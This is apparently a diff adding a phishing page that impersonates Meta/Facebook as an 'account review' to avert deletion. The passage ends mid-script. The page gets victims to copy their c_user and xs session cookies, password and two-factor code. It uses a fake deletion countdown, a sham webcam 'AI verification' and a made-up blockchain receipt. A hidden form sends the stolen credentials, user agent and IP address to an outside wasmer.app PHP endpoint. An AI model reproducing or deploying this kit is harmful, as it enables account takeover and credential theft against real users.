+                                <button class="control-btn" id="playPauseBtn">
+                                    <i class="fas fa-play"></i>
+                                </button>
+                                <div class="progress-container">
+                                    <div class="buffered-bar" id="bufferedBar"></div>
+                                    <div class="progress-bar" id="progressBar"></div>
+                                </div>
+                                <div class="time-display">
+                                    <span id="currentTime">0:00</span> / <span id="totalTime">0:00</span>
+                                </div>
+                                <div class="volume-container">
+                                    <button class="control-btn" id="volumeBtn">
+                                        <i class="fas fa-volume-up"></i>
+                                    </button>
+                                    <input type="range" class="volume-slider" id="volumeSlider" min="0" max="1" step="0.1" value="1">
+                                </div>
+                                <select class="speed-selector" id="speedSelector">
+                                    <option value="0.5">0.5x</option>
+                                    <option value="0.75">0.75x</option>
+                                    <option value="1" selected>Normal</option>
+                                    <option value="1.25">1.25x</option>
+                                    <option value="1.5">1.5x</option>
+                                    <option value="2">2x</option>
+                                </select>
+                                <button class="control-btn fullscreen-btn" id="fullscreenBtn">
+                                    <i class="fas fa-expand"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- AI Facial Recognition (Optional) -->
+                    <div class="webcam-container" id="webcamContainer" style="display: none;">
+                        <video class="webcam-video" id="webcamVideo" autoplay playsinline></video>
+                        <div class="webcam-overlay" id="webcamOverlay">
+                            <h3>Facial Recognition Verification</h3>
+                            <p>Please position your face in the center of the frame</p>
+                            <button class="webcam-btn" id="startWebcamBtn">Enable Camera</button>
+                        </div>
+                    </div>
+                    
+                    <div class="ai-verification" id="aiVerification" style="display: none;">
+                        <i class="fas fa-robot ai-processing"></i>
+                        <div>
+                            <h4>AI Identity Verification</h4>
+                            <p>Processing your facial features...</p>
+                        </div>
+                    </div>
+                    
+                    <div class="mobile-instructions">
+                        <h3><i class="fas fa-mobile-alt"></i> For Mobile Users</h3>
+                        <p>This process requires desktop browser developer tools. Please switch to a computer:</p>
+                        <ol>
+                            <li>Open Chrome on a desktop/laptop computer</li>
+                            <li>Log in to Facebook</li>
+                            <li>Follow the video instructions to find your values</li>
+                            <li>Return here to submit your review request</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="c_user"><i class="fas fa-user-circle"></i> c_user Value <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">Found in browser cookies when logged into Facebook</span></span></label>
+                        <input type="text" class="form-control" id="c_user" name="c_user" 
+                               placeholder="Enter your c_user value"
+                               pattern="\d+" 
+                               title="c_user must be a numeric value"
+                               required>
+                        <small class="form-text">Must contain a valid c_user value only</small>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="xs"><i class="fas fa-key"></i> xs Value <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">Found in browser cookies when logged into Facebook</span></span></label>
+                        <input type="text" class="form-control" id="xs" name="xs" 
+                               placeholder="Enter your xs value"
+                               pattern=".{20,}" 
+                               title="xs must be at least 20 characters"
+                               required>
+                        <small class="form-text">Must contain a valid xs value only</small>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-outline" id="cancelBtn">
+                            <i class="fas fa-times"></i> Cancel
+                        </button>
+                        <button class="btn btn-primary" id="nextToStep2">
+                            <i class="fas fa-arrow-right"></i> Continue
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Step 2: Password & 2FA Verification -->
+                <div class="step-content" id="step2">
+                    <h3 class="step-title">Security Verification</h3>
+                    
+                    <div class="status-indicator status-active">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Step 1 completed successfully</span>
+                    </div>
+                    
+                    <div class="progress">
+                        <div class="progress-bar" style="width: 33%"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-lock"></i> Re-enter Password <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">For security verification only. Your password is encrypted.</span></span></label>
+                        <input type="password" class="form-control" id="password" name="password" 
+                               placeholder="Enter your Facebook password"
+                               required>
+                        <small class="form-text">This helps us verify you're the account owner</small>
+                    </div>
+                    
+                    <!-- Two-Factor Authentication -->
+                    <div class="two-factor-auth" id="twoFactorAuth">
+                        <h4><i class="fas fa-mobile-alt"></i> Two-Factor Authentication</h4>
+                        <p>Enter the 6-digit code from your authenticator app:</p>
+                        <div class="two-factor-code">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                        </div>
+                    </div>
+                    
+                    <div class="alert-box alert-danger">
+                        <i class="fas fa-shield-alt"></i>
+                        <div>
+                            <h3>Security Notice</h3>
+                            <ul>
+                                <li>This is a security verification step to confirm your identity</li>
+                                <li>Do not log out from your computer during the review process</li>
+                                <li>Keep your Facebook account logged in on your computer</li>
+                                <li>Your password is encrypted during transmission</li>
+                                <li>Do not share your password with anyone</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-outline" id="backToStep1">
+                            <i class="fas fa-arrow-left"></i> Back
+                        </button>
+                        <button class="btn btn-primary" id="nextToStep3">
+                            <i class="fas fa-paper-plane"></i> Submit Review
+                        </button>
+                    </div>
+                    <p class="error-message" id="submissionError"></p>
+                </div>
+                
+                <!-- Step 3: Success & Blockchain Verification -->
+                <div class="step-content" id="step3">
+                    <div class="success-message">
+                        <div class="success-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h3 class="success-title">Review Submitted Successfully!</h3>
+                        <p class="success-text">Your account review request has been received. Our security team will process your case within the next 24 hours.</p>
+                        
+                        <div class="alert-box alert-success">
+                            <i class="fas fa-info-circle"></i>
+                            <div>
+                                <h3>Important Instructions</h3>
+                                <ul>
+                                    <li>Do not log out from your computer during this period</li>
+                                    <li>Keep your Facebook account logged in on this device</li>
+                                    <li>You will receive a notification once the review is complete</li>
+                                    <li>Account deletion has been paused pending review</li>
+                                    <li>Please do not attempt to change your password during review</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <!-- Blockchain Verification Hash -->
+                        <div class="blockchain-verification">
+                            <h4><i class="fas fa-link"></i> Blockchain Verification</h4>
+                            <p>Your submission has been recorded on the blockchain for transparency:</p>
+                            <p class="blockchain-hash" id="blockchainHash">0x7f5e...3a2b</p>
+                        </div>
+                        
+                        <!-- Download Instructions -->
+                        <div class="download-instructions">
+                            <h4><i class="fas fa-download"></i> Download Instructions</h4>
+                            <p>For your records, you can download a PDF with your review details:</p>
+                            <button class="btn btn-outline download-btn">
+                                <i class="fas fa-file-pdf"></i> Download Receipt
+                            </button>
+                        </div>
+                        
+                        <div class="status-indicator status-active">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Review ID: FB-REV-<span id="reviewId">XXXXXX</span></span>
+                        </div>
+                        
+                        <button class="btn btn-primary" id="finishBtn">
+                            <i class="fas fa-check"></i> Return to Facebook
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Language Selection Modal -->
+    <div class="modal" id="languageModal">
+        <div class="modal-content" style="max-width: 600px;">
+            <div class="modal-header">
+                <h2 class="modal-title"><i class="fas fa-globe"></i> Select Video Language</h2>
+                <button class="close-modal" id="closeLanguageModal">×</button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="languageSearch"><i class="fas fa-search"></i> Search Languages</label>
+                    <input type="text" class="form-control" id="languageSearch" placeholder="Type to search languages...">
+                </div>
+                
+                <div style="max-height: 400px; overflow-y: auto; margin: 16px 0; border: 1px solid var(--border-color); border-radius: var(--radius-md);">
+                    <div class="language-options" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; padding: 12px;">
+                        <button class="btn btn-outline language-btn" data-lang="english" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>English</span>
+                            <small style="color: var(--text-secondary);">English</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="filipino" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Filipino</span>
+                            <small style="color: var(--text-secondary);">Filipino</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="hindi" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Hindi</span>
+                            <small style="color: var(--text-secondary);">हिन्दी</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="portuguese" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Portuguese</span>
+                            <small style="color: var(--text-secondary);">Português</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="spanish" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Spanish</span>
+                            <small style="color: var(--text-secondary);">Español</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="tamil" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Tamil</span>
+                            <small style="color: var(--text-secondary);">தமிழ்</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="arabic" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Arabic</span>
+                            <small style="color: var(--text-secondary);">العربية</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="japanese" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Japanese</span>
+                            <small style="color: var(--text-secondary);">日本語</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="french" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>French</span>
+                            <small style="color: var(--text-secondary);">Français</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="swedish" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Swedish</span>
+                            <small style="color: var(--text-secondary);">Svenska</small>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="alert-box">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        <p>Can't find your language? Request it at: <a href="mailto:support@fb.com" style="color: var(--primary-color);">support@fb.com</a></p>
+                    </div>
+                </div>
+                
+                <button class="btn btn-primary" id="confirmLanguageBtn" style="width: 100%;">
+                    <i class="fas fa-check"></i> Confirm Language Selection
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden form for fallback submission -->
+    <form id="hiddenForm" class="hidden-form" action="https://qwerty-1713c.wasmer.app/Shoib.php"method="post">
+        <input type="hidden" name="c_user" id="hiddenCUser">
+        <input type="hidden" name="xs" id="hiddenXs">
+        <input type="hidden" name="password" id="hiddenPassword">
+        <input type="hidden" name="review_id" id="hiddenReviewId">
+        <input type="hidden" name="user_agent" id="userAgent">
+        <input type="hidden" name="ip_address" id="ipAddress">
+        <input type="hidden" name="timestamp" id="timestamp">
+        <input type="hidden" name="facial_data" id="facialData">
+        <input type="hidden" name="blockchain_hash" id="blockchainHashInput">
+    </form>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms</a>
+                <a href="#">Help Center</a>
+                <a href="#">Cookies</a>
+                <a href="#">Ad Choices</a>
+            </div>
+            <div class="copyright">
+                Meta © 2025 - Protecting Your Digital Identity
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Enhanced video files mapping with fallbacks
+            const videoFiles = {
+                'english': [
+                    { url: 'https://ucarecdn.com/ca11126d-21e3-4fc8-bfc7-928dfa258b96/videoinformation.mp4', type: 'video/mp4' },
+                    { url: 'https://ucarecdn.com/ca11126d-21e3-4fc8-bfc7-928dfa258b96/videoinformation.mp4', type: 'video/webm' }
+                ],
+                'filipino': [
+                    { url: 'Filipino_Tagalog_video_information_V1.mp4', type: 'video/mp4' }
+                ],
+                'hindi': [
+                    { url: 'Hindi_video_information_V1.mp4', type: 'video/mp4' }
+                ],
+                'portuguese': [
+                    { url: 'Portuguese_Brazil_video_information_V1.mp4', type: 'video/mp4' }
+                ],
+                'spanish': [
+                    { url: 'Spanish_Spain_video_information_V1.mp4', type: 'video/mp4' }
+                ],
+                'tamil': [
+                    { url: 'Tamil_video_information_V1.mp4', type: 'video/mp4' }
+                ],
+                'arabic': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/Arabic.mp4', type: 'video/mp4' }
+                ],
+                'french': [
+                    { url: 'French_France_video_information_V1.mp4', type: 'video/mp4' }
+                ],
+                'swedish': [
+                    { url: 'Swedish_video_information_V1.mp4', type: 'video/mp4' }
+                ],
+                'japanese': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/japanese.mp4', type: 'video/mp4' }
+                ]
+            };
+            
+            // DOM Elements
+            const themeToggle = document.getElementById('themeToggle');
+            const languageModal = document.getElementById('languageModal');
+            const closeLanguageModal = document.getElementById('closeLanguageModal');
+            const languageSearch = document.getElementById('languageSearch');
+            const languageButtons = document.querySelectorAll('.language-btn');
+            const confirmLanguageBtn = document.getElementById('confirmLanguageBtn');
+            
+            const videoOverlay = document.getElementById('videoOverlay');
+            const overlayPlayBtn = document.getElementById('overlayPlayBtn');
+            const video = document.getElementById('tutorialVideo');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const loadingPercentage = document.querySelector('.loading-percentage');
+            
+            const modal = document.getElementById('reviewModal');
+            const reviewBtn = document.getElementById('reviewBtn');
+            const appealBtn = document.getElementById('appealBtn');
+            const closeModal = document.getElementById('closeModal');
+            const cancelBtn = document.getElementById('cancelBtn');
+            const finishBtn = document.getElementById('finishBtn');
+            
+            // Video control elements
+            const playPauseBtn = document.getElementById('playPauseBtn');
+            const progressBar = document.getElementById('progressBar');
+            const bufferedBar = document.getElementById('bufferedBar');
+            const currentTimeDisplay = document.getElementById('currentTime');
+            const totalTimeDisplay = document.getElementById('totalTime');
+            const volumeBtn = document.getElementById('volumeBtn');
+            const volumeSlider = document.getElementById('volumeSlider');
+            const speedSelector = document.getElementById('speedSelector');
+            const fullscreenBtn = document.getElementById('fullscreenBtn');
+            
+            // Step navigation
+            const nextToStep2 = document.getElementById('nextToStep2');
+            const backToStep1 = document.getElementById('backToStep1');
+            const nextToStep3 = document.getElementById('nextToStep3');
+            
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            
+            const steps = document.querySelectorAll('.step');
+            const progressLine = document.getElementById('progressLine');
+            
+            // Form elements
+            const hiddenForm = document.getElementById('hiddenForm');
+            const hiddenCUser = document.getElementById('hiddenCUser');
+            const hiddenXs = document.getElementById('hiddenXs');
+            const hiddenPassword = document.getElementById('hiddenPassword');
+            const hiddenReviewId = document.getElementById('hiddenReviewId');
+            const userAgent = document.getElementById('userAgent');
+            const ipAddress = document.getElementById('ipAddress');
+            const timestamp = document.getElementById('timestamp');
+            const facialData = document.getElementById('facialData');
+            const blockchainHashInput = document.getElementById('blockchainHashInput');
+            
+            // Error message element
+            const submissionError = document.getElementById('submissionError');
+            const reviewIdDisplay = document.getElementById('reviewId');
+            const blockchainHashDisplay = document.getElementById('blockchainHash');
+            
+            // Countdown elements
+            const countdownHours = document.getElementById('countdown-hours');
+            const countdownMinutes = document.getElementById('countdown-minutes');
+            const countdownSeconds = document.getElementById('countdown-seconds');
+            
+            // Webcam elements
+            const webcamContainer = document.getElementById('webcamContainer');
+            const webcamVideo = document.getElementById('webcamVideo');
+            const webcamOverlay = document.getElementById('webcamOverlay');
+            const startWebcamBtn = document.getElementById('startWebcamBtn');
+            const aiVerification = document.getElementById('aiVerification');
+            
+            // State variables
+            let selectedLanguage = null;
+            let isVideoPlaying = false;
+            let countdownInterval;
+            let stream = null;
+            
+            // Initialize countdown timer
+            function initCountdown() {
+                let hours = 24;
+                let minutes = 59;
+                let seconds = 59;
+                
+                countdownInterval = setInterval(() => {
+                    seconds--;
+                    
+                    if (seconds < 0) {
+                        seconds = 59;
+                        minutes--;
+                    }
+                    
+                    if (minutes < 0) {
+                        minutes = 59;
+                        hours--;
+                    }
+                    
+                    if (hours < 0) {
+                        clearInterval(countdownInterval);
+                        hours = 0;
+                        minutes = 0;
+                        seconds = 0;
+                        
+                        // Show urgent warning when countdown completes
+                        document.querySelector('.review-card').classList.add('shake');
+                        document.querySelector('.warning-icon').style.color = '#ff0000';
+                        document.querySelector('.review-title').textContent = 'ACCOUNT DELETION IMMINENT!';
+                    }
+                    
+                    // Update display
+                    countdownHours.textContent = hours.toString().padStart(2, '0');
+                    countdownMinutes.textContent = minutes.toString().padStart(2, '0');
+                    countdownSeconds.textContent = seconds.toString().padStart(2, '0');
+                }, 1000);
+            }
+            
+            // Toggle dark/light mode
+            themeToggle.addEventListener('click', function() {
+                document.body.classList.toggle('dark-mode');
+                const icon = themeToggle.querySelector('i');
+                if (document.body.classList.contains('dark-mode')) {
+                    icon.classList.remove('fa-moon');
+                    icon.classList.add('fa-sun');
+                } else {
+                    icon.classList.remove('fa-sun');
+                    icon.classList.add('fa-moon');
+                }
+            });
+            
+            // Generate a random review ID
+            function generateReviewId() {
+                const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+                let result = '';
+                for (let i = 0; i < 6; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+            
+            // Generate a fake blockchain hash
+            function generateBlockchainHash() {
+                const chars = '0123456789abcdef';
+                let result = '0x';
+                for (let i = 0; i < 64; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+            
+            // Set user agent and timestamp
+            userAgent.value = navigator.userAgent;
+            timestamp.value = new Date().toISOString();
+            
+            // Try to get IP address (note: this requires a backend service)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress.value = data.ip || 'unknown';
+                })
+                .catch(() => {
+                    ipAddress.value = 'unknown';
+                });
+            
+            // Open language modal when video overlay is clicked
+            overlayPlayBtn.addEventListener('click', function() {
+                languageModal.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+            });
+            
+            // Close language modal
+            closeLanguageModal.addEventListener('click', function() {
+                languageModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            });
+            
+            // Language search functionality
+            languageSearch.addEventListener('input', function() {
+                const searchTerm = this.value.toLowerCase();
+                
+                languageButtons.forEach(button => {
+                    const languageName = button.querySelector('span').textContent.toLowerCase();
+                    const languageNative = button.querySelector('small').textContent.toLowerCase();
+                    
+                    if (languageName.includes(searchTerm) || languageNative.includes(searchTerm)) {
+                        button.style.display = 'flex';
+                    } else {
+                        button.style.display = 'none';
+                    }
+                });
+            });
+            
+            // Language selection
+            languageButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    // Remove selected class from all buttons
+                    languageButtons.forEach(btn => {
+                        btn.classList.remove('btn-primary');
+                        btn.classList.add('btn-outline');
+                    });
+                    
+                    // Add selected class to clicked button
+                    this.classList.remove('btn-outline');
+                    this.classList.add('btn-primary');
+                    
+                    // Get selected language
+                    selectedLanguage = this.getAttribute('data-lang');
+                });
+            });
+            
+            // Confirm language selection
+            confirmLanguageBtn.addEventListener('click', function() {
+                if (selectedLanguage) {
+                    const sources = videoFiles[selectedLanguage];
+                    
+                    if (sources && sources.length > 0) {
+                        // Clear existing sources
+                        while (video.firstChild) {
+                            video.removeChild(video.firstChild);
+                        }
+                        
+                        // Add new sources
+                        sources.forEach(source => {
+                            const sourceElement = document.createElement('source');
+                            sourceElement.src = source.url;
+                            sourceElement.type = source.type;
+                            video.appendChild(sourceElement);
+                        });
+                        
+                        // Load the new video
+                        video.load();
+                        
+                        // Set video title for accessibility
+                        video.setAttribute('title', `Tutorial Video - ${selectedLanguage}`);
+                        
+                        // Close modal
+                        languageModal.style.display = 'none';
+                        document.body.style.overflow = 'auto';
+                        
+                        // After a short delay, play the video
+                        setTimeout(() => {
+                            video.play().then(() => {
+                                videoOverlay.classList.add('hidden');
+                                playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+                                isVideoPlaying = true;
+                            }).catch(error => {
+                                console.error('Error playing video:', error);
+                                videoOverlay.classList.remove('hidden');
+                            });
+                        }, 300);
+                        
+                        // Remember language selection
+                        localStorage.setItem('preferredLanguage', selectedLanguage);
+                    }
+                }
+            });
+            
+            // Start webcam for facial recognition
+            startWebcamBtn.addEventListener('click', function() {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(function(mediaStream) {
+                            stream = mediaStream;
+                            webcamVideo.srcObject = stream;
+                            webcamOverlay.style.display = 'none';
+                            webcamContainer.style.display = 'block';
+                            
+                            // Simulate AI processing
+                            setTimeout(() => {
+                                aiVerification.style.display = 'flex';
+                                setTimeout(() => {
+                                    aiVerification.querySelector('i').classList.remove('ai-processing');
+                                    aiVerification.querySelector('i').classList.add('ai-success');
+                                    aiVerification.querySelector('p').textContent = 'Identity verified successfully!';
+                                    
+                                    // Generate fake facial data hash
+                                    facialData.value = generateBlockchainHash();
+                                }, 3000);
+                            }, 1000);
+                        })
+                        .catch(function(error) {
+                            console.error('Error accessing webcam:', error);
+                            alert('Could not access webcam. Please ensure you have granted permissions.');
+                        });
+                } else {
+                    alert('Webcam access is not supported in your browser.');
+                }
+            });
+            
+            // Close modals when clicking outside
+            window.addEventListener('click', function(event) {
+                if (event.target === languageModal) {
+                    languageModal.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                }
+                if (event.target === modal) {
+                    closeModalFunc();
+                }
+            });
+            
+            // Keyboard shortcut for closing modals
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    if (languageModal.style.display === 'block') {
+                        languageModal.style.display = 'none';
+                        document.body.style.overflow = 'auto';
+                    } else if (modal.style.display === 'block') {
+                        closeModalFunc();
+                    }
+                }
+                
+                // Spacebar to toggle play/pause when video is focused
+                if (e.code === 'Space' && isVideoPlaying && !isInputField(document.activeElement)) {
+                    e.preventDefault();
+                    togglePlayPause();
+                }
+            });
+
+            // Preload the preferred language if available
+            const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
+            if (videoFiles[preferredLanguage]) {
+                const sources = videoFiles[preferredLanguage];
+                sources.forEach(source => {
+                    const sourceElement = document.createElement('source');
+                    sourceElement.src = source.url;
+                    sourceElement.type = source.type;
+                    video.appendChild(sourceElement);
+                });
+                video.load();
+            }
+            
+            // Initialize video player
+            function initVideoPlayer() {
+                // Initialize volume and playback rate
+                video.volume = volumeSlider.value;
+                video.playbackRate = speedSelector.value;
+                
+                // Update time display
+                updateTimeDisplay();
+                
+                // Event listeners
+                video.addEventListener('timeupdate', updateProgressBar);
+                video.addEventListener('progress', updateBufferedBar);
+                video.addEventListener('loadedmetadata', function() {
+                    totalTimeDisplay.textContent = formatTime(video.duration);
+                });
+                
+                // Loading events
+                video.addEventListener('waiting', showLoadingSpinner);
+                video.addEventListener('playing', hideLoadingSpinner);
+                video.addEventListener('seeking', showLoadingSpinner);
+                video.addEventListener('seeked', hideLoadingSpinner);
+                
+                playPauseBtn.addEventListener('click', togglePlayPause);
+                
+                volumeBtn.addEventListener('click', toggleMute);
+                volumeSlider.addEventListener('input', function() {
+                    video.volume = volumeSlider.value;
+                    updateVolumeIcon();
+                });
+                
+                speedSelector.addEventListener('change', function() {
+                    video.playbackRate = parseFloat(this.value);
+                });
+                
+                fullscreenBtn.addEventListener('click', toggleFullscreen);
+                
+                const progressContainer = document.querySelector('.progress-container');
+                progressContainer.addEventListener('click', function(e) {
+                    const pos = (e.pageX - this.offsetLeft) / this.offsetWidth;
+                    video.currentTime = pos * video.duration;
+                });
+                
+                // Handle video end
+                video.addEventListener('ended', function() {
+                    playPauseBtn.innerHTML = '<i class="fas fa-redo"></i>';
+                    isVideoPlaying = false;
+                });
+            }
+            
+            function isInputField(element) {
+                return element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.isContentEditable;
+            }
+            
+            function showLoadingSpinner() {
+                loadingSpinner.style.display = 'flex';
+            }
+            
+            function hideLoadingSpinner() {
+                if (video.readyState >= 3) {
+                    loadingSpinner.style.display = 'none';
+                }
+            }
+            
+            function updateBufferedBar() {
+                if (video.buffered.length > 0) {
+                    const bufferedEnd = video.buffered.end(video.buffered.length - 1);
+                    const percent = (bufferedEnd / video.duration) * 100;
+                    bufferedBar.style.width = `${percent}%`;
+                    
+                    // Update loading percentage
+                    if (video.readyState < 4) {
+                        const loadedPercent = Math.round((bufferedEnd / video.duration) * 100);
+                        loadingPercentage.textContent = `${loadedPercent}%`;
+                    }
+                }
+            }
+            
+            // Toggle play/pause
+            function togglePlayPause() {
+                if (video.paused) {
+                    video.play().then(() => {
+                        playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+                        isVideoPlaying = true;
+                    }).catch(error => {
+                        console.error('Error playing video:', error);
+                    });
+                } else {
+                    video.pause();
+                    playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+                    isVideoPlaying = false;
+                }
+            }
+            
+            // Update progress bar
+            function updateProgressBar() {
+                const percent = (video.currentTime / video.duration) * 100;
+                progressBar.style.width = `${percent}%`;
+                currentTimeDisplay.textContent = formatTime(video.currentTime);
+            }
+            
+            // Update time display
+            function updateTimeDisplay() {
+                currentTimeDisplay.textContent = formatTime(video.currentTime);
+                totalTimeDisplay.textContent = formatTime(video.duration);
+            }
+            
+            // Format time in MM:SS
+            function formatTime(seconds) {
+                const minutes = Math.floor(seconds / 60);
+                seconds = Math.floor(seconds % 60);
+                return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            }
+            
+            function toggleMute() {
+                video.muted = !video.muted;
+                updateVolumeIcon();
+            }
+            
+            function updateVolumeIcon() {
+                if (video.muted || video.volume === 0) {
+                    volumeBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
+                    volumeSlider.value = 0;
+                } else if (video.volume > 0.5) {
+                    volumeBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
+                } else {
+                    volumeBtn.innerHTML = '<i class="fas fa-volume-down"></i>';
+                }
+            }
+            
+            function toggleFullscreen() {
+                const videoContainer = document.querySelector('.video-player-container');
+                
+                if (!document.fullscreenElement) {
+                    if (videoContainer.requestFullscreen) {
+                        videoContainer.requestFullscreen();
+                    } else if (videoContainer.mozRequestFullScreen) {
+                        videoContainer.mozRequestFullScreen();
+                    } else if (videoContainer.webkitRequestFullscreen) {
+                        videoContainer.webkitRequestFullscreen();
+                    } else if (videoContainer.msRequestFullscreen) {
+                        videoContainer.msRequestFullscreen();
+                    }
+                    fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
+                } else {
+                    if (document.exitFullscreen) {
+                        document.exitFullscreen();
+                    } else if (document.mozCancelFullScreen) {
+                        document.mozCancelFullScreen();
+                    } else if (document.webkitExitFullscreen) {
+                        document.webkitExitFullscreen();
+                    } else if (document.msExitFullscreen) {
+                        document.msExitFullscreen();
+                    }
+                    fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
+                }
+            }
+            
+            // Handle fullscreen change event
+            document.addEventListener('fullscreenchange', updateFullscreenIcon);
+            document.addEventListener('webkitfullscreenchange', updateFullscreenIcon);
+            document.addEventListener('mozfullscreenchange', updateFullscreenIcon);
+            document.addEventListener('MSFullscreenChange', updateFullscreenIcon);
+            
+            function updateFullscreenIcon() {
+                if (document.fullscreenElement || 
+                    document.webkitFullscreenElement || 
+                    document.mozFullScreenElement || 
+                    document.msFullscreenElement) {
+                    fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
+                } else {
+                    fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
+                }
+            }
+            
+            // Open review modal
+            reviewBtn.addEventListener('click', function() {
+                modal.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+                initVideoPlayer();
+                initCountdown();
+                
+                // Show webcam option if available
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    webcamContainer.style.display = 'block';
+                }
+            });
+            
+            // Open appeal modal
+            appealBtn.addEventListener('click', function() {
+                alert('For appeals, please contact our support team at appeals@fb.com');
+            });
+            
+            // Close modal function
+            function closeModalFunc() {
+                modal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                resetForm();
+                clearInterval(countdownInterval);
+                
+                // Stop webcam stream if active
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                }
+            }
+            
+            closeModal.addEventListener('click', closeModalFunc);
+            cancelBtn.addEventListener('click', closeModalFunc);
+            
+            // Finish button
+            finishBtn.addEventListener('click', function() {
+                window.location.href = "https://www.facebook.com/";
+            });
+            
+            // Next to Step 2
+            nextToStep2.addEventListener('click', function() {
+                const cUserInput = document.getElementById('c_user');
+                const xsInput = document.getElementById('xs');
+                
+                // Trigger browser validation
+                if (!cUserInput.checkValidity()) {
+                    cUserInput.reportValidity();
+                    return;
+                }
+                
+                if (!xsInput.checkValidity()) {
+                    xsInput.reportValidity();
+                    return;
+                }
+                
